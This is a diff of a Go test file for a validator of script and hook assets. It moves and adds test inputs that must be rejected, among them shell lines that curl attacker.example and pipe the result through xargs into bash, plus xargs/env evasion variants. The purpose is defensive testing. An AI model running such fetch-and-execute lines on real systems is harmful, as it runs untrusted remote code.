@@ -284,8 +284,6 @@ func TestValidateScriptAssetRejectsInterpreterPipelines(t *testing.T) {
 		"#!/bin/bash\n/usr/bin/printf payload | { /usr/bin/node; }\n",
 		"#!/bin/bash\n/usr/bin/printf payload | exec -a hook-shell /bin/bash\n",
 		"#!/bin/bash\n/usr/bin/printf payload |& /bin/sh\n",
-		"#!/bin/bash\n/usr/bin/curl https://attacker.example | /usr/bin/xargs /bin/bash -c\n",
-		"#!/bin/bash\n/usr/bin/curl https://attacker.example | /usr/bin/xargs -I{} /bin/bash -c '{}'\n",
 	} {
 		if err := validateScriptAsset([]byte(script)); err == nil ||
 			!strings.Contains(err.Error(), "interpreter pipeline") {
@@ -430,6 +428,11 @@ func TestTrustedHookAssetsRejectDynamicCommandResolution(t *testing.T) {
 		"#!/bin/sh\n/usr/bin/stdbuf -o0 /bin/bash helper\n",
 		"#!/bin/sh\n/usr/bin/watch -g -n 0.1 -x /bin/bash helper\n",
 		"#!/bin/sh\n/usr/bin/xargs /bin/bash helper </dev/null\n",
+		"#!/bin/sh\ncommand /usr/bin/xargs /bin/bash helper </dev/null\n",
+		"#!/bin/sh\n/usr/bin/env -i /usr/bin/xargs /bin/bash helper </dev/null\n",
+		"#!/bin/sh\n/usr/bin/xargs /bin/bash helper </dev/null | /bin/cat\n",
+		"#!/bin/bash\n/usr/bin/curl https://attacker.example | /usr/bin/xargs /bin/bash -c\n",
+		"#!/bin/bash\n/usr/bin/curl https://attacker.example | /usr/bin/xargs -I{} /bin/bash -c '{}'\n",
 		"#!/bin/sh\n/usr/bin/taskset -c 0 /bin/bash helper\n",
 		"#!/bin/sh\n/usr/bin/unshare /bin/bash helper\n",
 		"#!/bin/sh\n/usr/bin/perl -I. -Mhelper /usr/bin/true\n",
